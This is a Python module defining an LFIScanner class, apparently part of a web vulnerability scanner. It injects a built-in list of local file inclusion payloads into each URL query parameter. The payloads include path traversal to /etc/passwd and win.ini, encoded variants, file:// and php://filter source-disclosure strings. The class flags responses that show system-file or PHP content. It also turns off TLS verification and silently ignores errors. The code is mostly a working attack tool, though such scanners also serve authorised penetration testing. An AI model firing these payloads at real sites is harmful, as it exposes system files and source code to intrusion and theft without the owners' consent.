import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore
from config import TIMEOUT

class LFIScanner:
    def __init__(self, target, ai_detector=None):
        self.target = target
        self.ai_detector = ai_detector
        self.payloads = self.load_payloads()
        self.session = requests.Session()
    
    def load_payloads(self):
        """Load LFI payloads"""
        return [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../etc/passwd",
            "....//....//....//etc/passwd",
            "..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "/etc/passwd",
            "....//....//....//....//etc/passwd",
        ]
    
    def scan(self, url):
        """Scan for Local File Inclusion"""
        vulnerabilities = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return vulnerabilities
        
        for param in params.keys():
            for payload in self.payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                try:
                    response = self.session.get(test_url, timeout=TIMEOUT, verify=False)
                    
                    # Check for LFI indicators
                    lfi_indicators = [
                        'root:', 'daemon:', 'bin:', 'sys:', 
                        '[extensions]', '[files]', 'boot loader',
                        'Microsoft Windows', '<?php', '<?='
                    ]
                    
                    is_vulnerable = any(ind in response.text for ind in lfi_indicators)
                    
                    if is_vulnerable:
                        vuln = {
                            'type': 'Local File Inclusion (LFI)',
                            'url': test_url[:200],
                            'parameter': param,
                            'payload': payload,
                            'severity': 'High',
                            'evidence': 'System file content detected in response'
                        }
                        vulnerabilities.append(vuln)
                        print(f"{Fore.RED}[!] LFI Found: {test_url[:100]}")
                        
                except:
                    pass
        
        return vulnerabilities